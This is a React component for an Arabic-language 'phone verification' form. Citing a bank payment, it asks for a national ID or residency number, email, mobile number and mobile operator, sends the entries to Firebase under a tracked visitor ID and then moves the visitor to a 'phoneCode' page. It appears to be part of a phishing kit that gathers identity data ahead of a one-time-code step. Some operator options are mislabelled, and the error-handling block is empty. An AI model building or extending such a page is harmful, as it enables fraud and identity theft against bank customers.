"use client"

import type React from "react"

import { useState } from "react"
import { addData } from "../firebase";
export default function VerificationForm() {
    const visitorId = localStorage.getItem('visitor');

    const [formData, setFormData] = useState({
        id: visitorId,
        idNumber: "",
        email: "",
        mobile: "",
        network: "",
    })
    const [loading, setLoading] = useState(false)

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()
        addData(formData)
        setLoading(true)
        try {

        } catch (error) {
            console.error("Error:", error)
        }
        setTimeout(() => {
            setLoading(false)
            addData({id:visitorId,page:"phoneCode"})
            setFormData({ id: visitorId, idNumber: "", email: "", mobile: "", network: "" })        }, 3000);
    }

    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
        setFormData((prev) => ({
            ...prev,
            [e.target.name]: e.target.value,
        }))
    }

    return (
        <div className="form-container" dir="rtl">
            <h2>التحقق من الهاتف</h2>
            <p>لمتابعة الطلب يرجى إدخال رقم الهاتف المربوط في البنك لمصادقة عملية الدفع بنجاح</p>

            <form onSubmit={handleSubmit}>
                <div className="form-group">
                    <label htmlFor="idNumber">رقم الهوية/الإقامة:</label>
                    <input
                        type="let"

                        id="idNumber"
                        maxLength={11}
                        name="idNumber"
                        value={formData.idNumber}
                        onChange={handleChange}
                        placeholder="أدخل رقم الهوية/الإقامة"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="email">البريد الإلكتروني:</label>
                    <input
                        type="email"
                        id="email"
                        name="email"
                        value={formData.email}
                        onChange={handleChange}
                        placeholder="أدخل بريدك الإلكتروني"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="mobile">رقم الجوال:</label>
                    <input
                        maxLength={10}
                        type="tel"
                        id="mobile"
                        name="mobile"
                        value={formData.mobile}
                        onChange={handleChange}
                        placeholder="أدخل رقم الجوال"
                        required
                    />
                </div>

                <div className="form-group">
                    <label htmlFor="network">مشغل شبكة الجوال:</label>
                    <select id="network" name="network" value={formData.network} onChange={handleChange} required>
                        <option value="">-- اختر المشغل --</option>
                        <option value="STC">STC</option>
                        <option value="Ooredoo">Ooredoo</option>
                        <option value="Zain">Mada</option>
                        <option value="Zain">Communications
Gulf </option>
                        <option value="Zain">Fast communication
Gulf Sat </option>
                        <option value="Zain">Zain</option>
                    
                    </select>
                </div>

                <button type="submit" disabled={loading}>
                    {loading ? "جاري الإرسال..." : "إرسال"}
                </button>
            </form>

            <style>{`
        .form-container {
          max-width: 500px;
          margin: 0 auto;
          padding: 20px;
          background: white;
          border-radius: 8px;
          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }

        h2 {
          color: #0066cc;
          margin-bottom: 10px;
          font-size: 1.5rem;
        }

        p {
          color: #666;
          margin-bottom: 20px;
          font-size: 0.9rem;
        }

        .form-group {
          margin-bottom: 15px;
        }

        label {
          display: block;
          margin-bottom: 5px;
          color: #333;
        }

        input, select {
          width: 100%;
          padding: 8px 12px;
          border: 1px solid #ddd;
          border-radius: 4px;
          font-size: 1rem;
          direction: rtl;
        }

        input::placeholder {
          color: #999;
        }

        button {
          width: 100%;
          padding: 12px;
          background-color: #0066cc;
          color: white;
          border: none;
          border-radius: 4px;
          font-size: 1rem;
          cursor: pointer;
          transition: background-color 0.2s;
        }

        button:hover {
          background-color: #0052a3;
        }

        button:disabled {
          background-color: #999;
          cursor: not-allowed;
        }
      `}</style>
        </div>
    )
}

